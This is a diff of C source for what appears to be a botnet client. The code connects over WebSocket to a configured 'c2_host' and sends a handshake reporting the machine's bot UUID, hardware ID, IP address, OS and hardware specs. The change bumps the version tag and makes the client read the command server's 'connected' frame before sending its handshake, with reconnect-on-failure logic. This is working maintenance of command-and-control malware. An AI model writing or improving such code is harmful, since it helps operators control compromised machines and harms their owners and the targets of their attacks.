@@ -10,7 +10,7 @@ char g_bot_uuid[64] = {0};
 char g_cur_task_id[64] = {0};
 
 /* Must match GitHub release tag style for auto-update compare */
-#define BOT_VERSION_TAG "v4.0.18"
+#define BOT_VERSION_TAG "v4.0.19"
 
 static void sig_handler(int sig) { (void)sig; g_shutdown = 1; }
 
@@ -182,6 +182,7 @@ int main(int argc, char *argv[])
     while (!g_shutdown)
     {
         WS ws = {0};
+        ws.sockfd = -1;
         strcpy(ws.host, cfg.c2_host);
         ws.port = cfg.c2_port;
         strcpy(ws.path, cfg.c2_path);
@@ -199,6 +200,7 @@ int main(int argc, char *argv[])
             }
             if (g_shutdown) { pthread_mutex_destroy(&ws.io); break; }
         }
+        if (foreground) fprintf(stderr, "[bot] WS connected\n");
 
         char esc_ip[128], esc_os[256], esc_hwid[64];
         json_escape(info.ip_addr, esc_ip, sizeof(esc_ip));
@@ -212,9 +214,6 @@ int main(int argc, char *argv[])
                  "\"ram_total_mb\":%d,\"net_speed_mbps\":%d,\"version\":\"%s\"}",
                  g_bot_uuid, esc_hwid, esc_ip, esc_os, info.cpu_cores, info.ram_mb,
                  info.net_mbps, BOT_VERSION_TAG);
-        if (foreground) fprintf(stderr, "[bot] WS connected, handshake sent\n");
-        int wr = ws_send(&ws, hs);
-        if (foreground && wr <= 0) fprintf(stderr, "[bot] handshake send FAIL wr=%d\n", wr);
 
         time_t last_hb = time(NULL);
         time_t last_recv = time(NULL);
@@ -224,6 +223,42 @@ int main(int argc, char *argv[])
         int hb_fail = 0;
         int recv_fail = 0;
         int handshaked = 0;
+        int hs_sent = 0;
+
+        /* Drain server "connected" frame first, THEN send handshake.
+         * Avoid SSL write while unread app data sits in the buffer. */
+        {
+            char pre[4096];
+            int pn = ws_recv(&ws, pre, sizeof(pre));
+            if (pn > 0) {
+                last_recv = time(NULL);
+                char t0[64] = {0};
+                json_str(pre, "type", t0, sizeof(t0));
+                if (foreground) fprintf(stderr, "[bot] pre-recv type=%s\n", t0[0] ? t0 : "?");
+                if (!strcmp(t0, "connected") || !strcmp(t0, "handshake_ack") ||
+                    !strcmp(t0, "heartbeat_ack") || !strcmp(t0, "pong"))
+                    handshaked = 1;
+            } else if (pn < 0) {
+                if (foreground) fprintf(stderr, "[bot] pre-recv hard error, reconnect\n");
+                ws_disconnect(&ws);
+                pthread_mutex_destroy(&ws.io);
+                sleep(cfg.reconnect_min);
+                continue;
+            }
+        }
+
+        int wr = ws_send(&ws, hs);
+        hs_sent = (wr > 0);
+        if (foreground) {
+            if (hs_sent) fprintf(stderr, "[bot] handshake sent wr=%d\n", wr);
+            else fprintf(stderr, "[bot] handshake send FAIL wr=%d\n", wr);
+        }
+        if (!hs_sent) {
+            ws_disconnect(&ws);
+            pthread_mutex_destroy(&ws.io);
+            sleep(cfg.reconnect_min);
+            continue;
+        }
 
         while (!g_shutdown)
         {
